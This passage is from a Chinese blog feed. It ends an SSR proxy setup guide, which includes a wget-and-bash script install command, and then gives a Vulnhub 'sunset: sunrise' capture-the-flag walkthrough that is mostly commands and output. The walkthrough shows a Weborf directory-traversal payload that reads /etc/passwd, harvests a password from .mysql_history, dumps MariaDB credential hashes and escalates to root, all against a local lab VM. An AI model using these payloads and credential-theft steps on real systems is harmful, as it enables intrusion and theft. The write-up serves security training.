<p>6、vultr服务商提供的vps服务器是单向流量计算，有的vps服务商是双向流量计算，单向流量计算对于用户来说更实惠。因为我们是在vps服务器上部署SSR服务端后，再用SSR客户端翻墙，所以SSR服务端就相当于中转，比如我们看一个视频，必然会产生流量，假如消耗流量80M，那么VPS服务器会产生上传80M和下载80M流量，vultr服务商只计算单向的80M流量。如果是双向计算流量，那么会计算为160M流量。</p>
<p>7、如果你想把搭建的账号给多人使用，不用额外设置端口，因为一个账号就可以多人使用。一般5美元的服务器可以同时支持40人在线使用。</p>
<p>如果想实现支持每个用户(端口)不同的加密方式/协议/混淆等，并且管理流量使用，可以参考多用户配置脚本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -N --no-check-certificate https://raw.githubusercontent.com/ToyoDAdoubi/doubi/master/ssrmu.sh &amp;&amp; chmod +x ssrmu.sh &amp;&amp; bash ssrmu.sh </span><br></pre></td></tr></table></figure>
<p>安装后管理命令为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash ssrmu.sh</span><br></pre></td></tr></table></figure>
<p>注意：这个多用户配置脚本和教程内容的脚本无法共存！要想用这个脚本，把之前的脚本卸载，输入管理命令bash ssr.sh ，选择3，卸载ShadowsocksR即可卸载原脚本。</p>
<p>8、vultr服务器每月有流量限制，超过限制后服务器不会被停止运行，但是超出的流量会被额外收费。北美和西欧地区的服务器超出流量后，多出的部分收费为0.01美元/G。新加坡和日本东京（日本）为0.025美元/G，悉尼（澳大利亚）为0.05美元/G。把vultr服务器删掉，开通新的服务器，流量会从0开始重新计算。</p>
<p>9、vultr怎样才能申请退款呢？</p>
<p>vultr和其他的国外商家一样，都是使用工单的形式与客服联系，如果需要退款，直接在后台点击support，选择open ticket新开一个工单，选择billing question财务问题，简单的在文本框输入你的退款理由。比如：Please refund all the balance in my account。工单提交以后一般很快就可以给你确认退款，若干个工作日后就会退回你的支付方式。（全额退款结束后，账号可能会被删除）</p>
<p>如果英语水平不好，但是想和客服进行交流，可以用百度在线翻译，自动中文转英文和英文转中文。</p>
<p>10、路由器也可以配置ss/ssr账号，详见<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3l3Yjk0L29wZW53cnQtc3Ny">openwrt-ssr项目地址<i class="fa fa-external-link-alt"></i></span></p>
<p>11、如果电脑想用搭建的ss/ssr账号玩游戏，即实现类似VPN全局代理，可以用SSTAP，<span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC81MTllNjhiNzQ2NDY=">教程<i class="fa fa-external-link-alt"></i></span></p>
<p>12、配置bbr加速脚本，重启电脑后xshell无法连接服务器。如果你遇到这样的问题，只能把服务器删除了，重新搭建个新的，可以先配置bbr加速脚本再配置ss/ssr脚本。</p>
<p><strong><em>更多问题请联系QQ:</em></strong></p>
<p><font color="red">FDlucifer——1185151867</font></p>
]]></content>
      <categories>
        <category>科学上网</category>
      </categories>
      <tags>
        <tag>ssr</tag>
        <tag>vps</tag>
        <tag>翻墙</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[sunset-sunrise]</title>
    <url>/2019/12/24/sunset-sunrise/</url>
    <content><![CDATA[<p>名称：日落：日出<br>发布日期：2019年12月6日</p>
<p>下载：</p>
<ul>
<li>Download: <span class="exturl" data-url="aHR0cHM6Ly9tZWdhLm56LyMhSUtRUTJTeFohYW5Cc0JubFFyWWgyRUxZV1lhMW1IWUtHXzdrUnc0MDJ6Zm8yV09PQjhaMA==">https://mega.nz/#!IKQQ2SxZ!anBsBnlQrYh2ELYWYa1mHYKG_7kRw402zfo2WOOB8Z0<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9zdW5zZXQvc3VucmlzZS43eg==">https://download.vulnhub.com/sunset/sunrise.7z<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9zdW5zZXQvc3VucmlzZS43ei50b3JyZW50">https://download.vulnhub.com/sunset/sunrise.7z.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>描述：</p>
<p>说明：玩得开心！<br>难度：初学者<br>联系人：@whitecr0wz</p>
<a id="more"></a>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.104</span><br><span class="line">Host is up (0.00027s latency).</span><br><span class="line">MAC Address: 08:00:27:67:12:DE (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -A -v -sS -sV -Pn -T5 -p- --script=vuln 192.168.56.104</span></span><br><span class="line">PORT     STATE SERVICE    VERSION</span><br><span class="line">22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">80/tcp   open  http       Apache httpd 2.4.38</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|_  /: Root directory w/ listing on <span class="string">&#x27;apache/2.4.38 (debian)&#x27;</span></span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">| http-sql-injection: </span><br><span class="line">|   Possible sqli <span class="keyword">for</span> queries:</span><br><span class="line">|     http://192.168.56.104:80/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=N%3bO%3dD%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=D%3bO%3dD%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=N%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=N%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=M%3bO%3dD%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=N%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=S%3bO%3dD%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=N%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=N%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=N%3bO%3dD%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=N%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|_    http://192.168.56.104:80/?C=N%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br><span class="line"><span class="string">3306/tcp open  mysql?</span></span><br><span class="line"><span class="string">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">| fingerprint-strings: </span></span><br><span class="line"><span class="string">|   NULL: </span></span><br><span class="line"><span class="string">|_    Host &#x27;</span>192.168.56.102<span class="string">&#x27; is not allowed to connect to this MariaDB server</span></span><br><span class="line"><span class="string">|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">8080/tcp open  http-proxy Weborf (GNU/Linux)</span></span><br><span class="line"><span class="string">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">| fingerprint-strings: </span></span><br><span class="line"><span class="string">|   FourOhFourRequest: </span></span><br><span class="line"><span class="string">|     HTTP/1.1 404 Page not found: Weborf (GNU/Linux)</span></span><br><span class="line"><span class="string">|     Content-Length: 202</span></span><br><span class="line"><span class="string">|     Content-Type: text/html</span></span><br><span class="line"><span class="string">|     &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Weborf&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;H1&gt;Error 404&lt;/H1&gt;Page not found &lt;p&gt;Generated by Weborf/0.12.2 (GNU/Linux)&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string">|   GetRequest: </span></span><br><span class="line"><span class="string">|     HTTP/1.1 200</span></span><br><span class="line"><span class="string">|     Server: Weborf (GNU/Linux)</span></span><br><span class="line"><span class="string">|     Content-Length: 326</span></span><br><span class="line"><span class="string">|     &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Weborf&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;Name&lt;/td&gt;&lt;td&gt;Size&lt;/td&gt;&lt;/tr&gt;&lt;tr style=&quot;background-color: #DFDFDF;&quot;&gt;&lt;td&gt;d&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;html/&quot;&gt;html/&lt;/a&gt;&lt;/td&gt;&lt;td&gt;-&lt;/td&gt;&lt;/tr&gt;</span></span><br><span class="line"><span class="string">|     &lt;/table&gt;&lt;p&gt;Generated by Weborf/0.12.2 (GNU/Linux)&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string">|   HTTPOptions, RTSPRequest, SIPOptions: </span></span><br><span class="line"><span class="string">|     HTTP/1.1 200</span></span><br><span class="line"><span class="string">|     Server: Weborf (GNU/Linux)</span></span><br><span class="line"><span class="string">|     Allow: GET,POST,PUT,DELETE,OPTIONS,PROPFIND,MKCOL,COPY,MOVE</span></span><br><span class="line"><span class="string">|     DAV: 1,2</span></span><br><span class="line"><span class="string">|     DAV: &lt;http://apache.org/dav/propset/fs/1&gt;</span></span><br><span class="line"><span class="string">|     MS-Author-Via: DAV</span></span><br><span class="line"><span class="string">|   Socks5: </span></span><br><span class="line"><span class="string">|     HTTP/1.1 400 Bad request: Weborf (GNU/Linux)</span></span><br><span class="line"><span class="string">|     Content-Length: 199</span></span><br><span class="line"><span class="string">|     Content-Type: text/html</span></span><br><span class="line"><span class="string">|_    &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Weborf&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;H1&gt;Error 400&lt;/H1&gt;Bad request &lt;p&gt;Generated by Weborf/0.12.2 (GNU/Linux)&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string">| http-enum: </span></span><br><span class="line"><span class="string">|   /../../../../../../../../../../etc/passwd: Possible path traversal in URI</span></span><br><span class="line"><span class="string">|   /../../../../../../../../../../boot.ini: Possible path traversal in URI</span></span><br><span class="line"><span class="string">|_  /html/: Potentially interesting folder</span></span><br><span class="line"><span class="string">|_http-server-header: Weborf (GNU/Linux)</span></span><br></pre></td></tr></table></figure>

<p>访问<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguNTYuMTA0OjgwODAvJUVGJUJDJThDJUU1JThGJTkxJUU3JThFJUIwJUU2JTk4JUFGV2Vib3JmLzAuMTIuMg==">http://192.168.56.104:8080/，发现是Weborf/0.12.2<i class="fa fa-external-link-alt"></i></span></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub95.jpg"></p>
<p>现在使用searchsploit搜索Weborf。 如果没有成功，尝试其他方法。 但是成功了。 说此版本的Weborf容易受到目录遍历攻击。 下载漏洞利用程序的内容，以获取相关信息。 漏洞利用提供了一条易受攻击的方法。 尝试一下。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># searchsploit Weborf 0.12.2</span></span><br><span class="line">-------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                |  Path</span><br><span class="line">                                                              | (/usr/share/exploitdb/)</span><br><span class="line">-------------------------------------------------------------- ----------------------------------------</span><br><span class="line">weborf 0.12.2 - Directory Traversal                           | exploits/linux/remote/14925.txt</span><br><span class="line">-------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br><span class="line">root@kali:~<span class="comment"># searchsploit -m 14925</span></span><br><span class="line">  Exploit: weborf 0.12.2 - Directory Traversal</span><br><span class="line">      URL: https://www.exploit-db.com/exploits/14925</span><br><span class="line">     Path: /usr/share/exploitdb/exploits/linux/remote/14925.txt</span><br><span class="line">File Type: ASCII text, with CRLF line terminators</span><br><span class="line"></span><br><span class="line">Copied to: /root/14925.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># cat 14925.txt </span></span><br><span class="line">Title: Weborf httpd &lt;= 0.12.2 Directory Traversal Vulnerability</span><br><span class="line">Date: Sep 6, 2010</span><br><span class="line">Author: Rew</span><br><span class="line">Link: http://galileo.dmi.unict.it/wiki/weborf/doku.php</span><br><span class="line">Version: 0.12.2</span><br><span class="line">Tested On: Debian 5</span><br><span class="line">CVE: N/A</span><br><span class="line"></span><br><span class="line">=============================================================</span><br><span class="line"></span><br><span class="line">Weborf httpd &lt;= 0.12.2 suffers a directory traversal</span><br><span class="line">vulnerability.  This vulnerability could allow</span><br><span class="line">attackers to <span class="built_in">read</span> arbitrary files and hak th3 plan3t.</span><br><span class="line"></span><br><span class="line">instance.c : line 240-244</span><br><span class="line">------------------------------</span><br><span class="line">void modURL(char* url) &#123;</span><br><span class="line">    //Prevents the use of .. to access the whole filesystem  &lt;-- ORLY?</span><br><span class="line">    strReplace(url,<span class="string">&quot;../&quot;</span>,<span class="string">&#x27;\0&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    replaceEscape(url);</span><br><span class="line">------------------------------</span><br><span class="line"></span><br><span class="line">Exploit: GET /..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd</span><br><span class="line"></span><br><span class="line">==============================================================</span><br><span class="line"></span><br><span class="line">Stay safe,</span><br><span class="line">Over and Outr</span><br></pre></td></tr></table></figure>

<p>按照exp中的利用方法构造如下poc并访问</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.104:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub96.jpg"></p>
<p>现在，能在目标计算机内四处查找文件。 决定在用户Sunrise的主目录中进行文件查看。 遇到了一个user.txt文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.104:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fsunrise%2f</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub97.jpg"></p>
<p>打开user.txt查找文本，如下所示。 是一个简单的user的flag。 </p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub98.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">a6050aecf6303b0b824038807d823a89</span><br></pre></td></tr></table></figure>

<p>接下来对下面url爆破一波</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.104:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf%2f</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># dirb http://192.168.56.104:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf%2f</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Wed Dec 25 03:38:57 2019</span><br><span class="line">URL_BASE: http://192.168.56.104:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf%2f/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.56.104:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf%2f/ ----</span><br><span class="line">+ http://192.168.56.104:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf%2f/.bashrc (CODE:200|SIZE:3526)</span><br><span class="line">+ http://192.168.56.104:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf%2f/.mysql_history (CODE:200|SIZE:83)</span><br><span class="line">+ http://192.168.56.104:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf%2f/.profile (CODE:200|SIZE:807)</span><br><span class="line">                                                                               %2fweborf%2f/zt               </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Wed Dec 25 03:39:12 2019</span><br><span class="line">DOWNLOADED: 4612 - FOUND: 3</span><br></pre></td></tr></table></figure>

<p>访问下面url可得</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.104:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf%2f/.mysql_history</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub99.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">show databases;</span><br><span class="line">ALTER USER <span class="string">&#x27;weborf&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED BY <span class="string">&#x27;iheartrainbows44&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>使用用户名和密码weborf/iheartrainbows44成功连接ssh</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh weborf@192.168.56.104</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.56.104 (192.168.56.104)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:4yaOo7mwlBs//3V1VVqqtiApksgelyI4AJwhIUfz0UQ.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.56.104<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">weborf@192.168.56.104&#x27;</span>s password: </span><br><span class="line">Linux sunrise 4.19.0-6-amd64 <span class="comment">#1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Thu Dec  5 16:24:32 2019 from 192.168.1.146</span><br><span class="line">weborf@sunrise:~$ id</span><br><span class="line">uid=1001(weborf) gid=1001(weborf) groups=1001(weborf)</span><br><span class="line">weborf@sunrise:~$ whoami</span><br><span class="line">weborf</span><br><span class="line">weborf@sunrise:~$ <span class="built_in">pwd</span></span><br><span class="line">/home/weborf</span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>连接数据库获取用户名和密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">weborf@sunrise:~$ mysql -uweborf -piheartrainbows44</span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection id is 37</span><br><span class="line">Server version: 10.3.18-MariaDB-0+deb10u1 Debian 10</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; </span><br><span class="line">MariaDB [(none)]&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">+--------------------+</span><br><span class="line">3 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.028 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; use mysql;</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">MariaDB [mysql]&gt; show tables;</span><br><span class="line">+---------------------------+</span><br><span class="line">| Tables_in_mysql           |</span><br><span class="line">+---------------------------+</span><br><span class="line">| column_stats              |</span><br><span class="line">| columns_priv              |</span><br><span class="line">| db                        |</span><br><span class="line">| event                     |</span><br><span class="line">| func                      |</span><br><span class="line">| general_log               |</span><br><span class="line">| gtid_slave_pos            |</span><br><span class="line">| help_category             |</span><br><span class="line">| help_keyword              |</span><br><span class="line">| help_relation             |</span><br><span class="line">| help_topic                |</span><br><span class="line">| host                      |</span><br><span class="line">| index_stats               |</span><br><span class="line">| innodb_index_stats        |</span><br><span class="line">| innodb_table_stats        |</span><br><span class="line">| plugin                    |</span><br><span class="line">| proc                      |</span><br><span class="line">| procs_priv                |</span><br><span class="line">| proxies_priv              |</span><br><span class="line">| roles_mapping             |</span><br><span class="line">| servers                   |</span><br><span class="line">| slow_log                  |</span><br><span class="line">| table_stats               |</span><br><span class="line">| tables_priv               |</span><br><span class="line">| time_zone                 |</span><br><span class="line">| time_zone_leap_second     |</span><br><span class="line">| time_zone_name            |</span><br><span class="line">| time_zone_transition      |</span><br><span class="line">| time_zone_transition_type |</span><br><span class="line">| transaction_registry      |</span><br><span class="line">| user                      |</span><br><span class="line">+---------------------------+</span><br><span class="line">31 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.000 sec)</span><br><span class="line">MariaDB [mysql]&gt; select * from user;</span><br><span class="linespan><br><span class="line">| Host      | User    | Password                                  | Select_priv | Insert_priv | Update_priv | Delete_priv | Create_priv | Drop_priv | Reload_priv | Shutdown_priv | Process_priv | File_priv | Grant_priv | References_priv | Index_priv | Alter_priv | Show_db_priv | Super_priv | Create_tmp_table_priv | Lock_tables_priv | Execute_priv | Repl_slave_priv | Repl_client_priv | Create_view_priv | Show_view_priv | Create_routine_priv | Alter_routine_priv | Create_user_priv | Event_priv | Trigger_priv | Create_tablespace_priv | Delete_history_priv | ssl_type | ssl_cipher | x509_issuer | x509_subject | max_questions | max_updates | max_connections | max_user_connections | plugin      | authentication_string                     | password_expired | is_role | default_role | max_statement_time |</span><br><span class="linespan><br><span class="line">| localhost | root    | *C7B6683EEB8FF8329D8390574FAA04DD04B87C58 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      | Y                   |          |            |             |              |             0 |           0 |               0 |                    0 | unix_socket | *AF554C323F838EB43A3D464034692C0994346ED8 | N                | N       |              |           0.000000 |</span><br><span class="line">| localhost | sunrise | thefutureissobrightigottawearshades       | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            | N                      | N                   |          |            |             |              |             0 |           0 |               0 |                    0 |             |                                           | N                | N       |              |           0.000000 |</span><br><span class="line">| localhost | weborf  | *A76018C6BB42E371FD7B71D2EC6447AE6E37DB28 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | N          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      | Y                   |          |            |             |              |             0 |           0 |               0 |                    0 |             |                                           | N                | N       |              |           0.000000 |</span><br><span class="linespan><br><span class="line">3 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.000 sec)</span><br></pre></td></tr></table></figure>

<p>将root的hash值解密得到purplerain54732,直接root用户登录完成提权</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub100.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">weborf@sunrise:~$ su root</span><br><span class="line">Password: </span><br><span class="line">root@sunrise:/home/weborf<span class="comment"># ls</span></span><br><span class="line">weborf-0.12.2</span><br><span class="line">root@sunrise:/home/weborf<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@sunrise:/home/weborf<span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<h3 id="得到flag"><a href="#得到flag" class="headerlink" title="得到flag"></a>得到flag</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@sunrise:/home/weborf<span class="comment"># cd /root</span></span><br><span class="line">root@sunrise:~<span class="comment"># ls</span></span><br><span class="line">Desktop  Documents  Downloads  Groups  Logs  Manual  Music  Pictures  Public  Readme  root.txt  Templates  Users  Videos</span><br><span class="line">root@sunrise:~<span class="comment"># cat root.txt</span></span><br><span class="line">            ^^                   @@@@@@@@@</span><br><span class="line">       ^^       ^^            @@@@@@@@@@@@@@@</span><br><span class="line">                            @@@@@@@@@@@@@@@@@@              ^^</span><br><span class="line">                           @@@@@@@@@@@@@@@@@@@@</span><br><span class="line"> ~~~~ ~~ ~~~~~ ~~~~~~~~ ~~ &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp; ~~~~~~~ ~~~~~~~~~~~ ~~~</span><br><span class="line"> ~         ~~   ~  ~       ~~~~~~~~~~~~~~~~~~~~ ~       ~~     ~~ ~</span><br><span class="line">   ~      ~~      ~~ ~~ ~~  ~~~~~~~~~~~~~ ~~~~  ~     ~~~    ~ ~~~  ~ ~~</span><br><span class="line">   ~  ~~     ~         ~      ~~~~~~  ~~ ~~~       ~~ ~ ~~  ~~ ~</span><br><span class="line"> ~  ~       ~ ~      ~           ~~ ~~~~~~  ~      ~~  ~             ~~</span><br><span class="line">       ~             ~        ~      ~      ~~   ~             ~</span><br><span class="line"></span><br><span class="line">Thanks <span class="keyword">for</span> 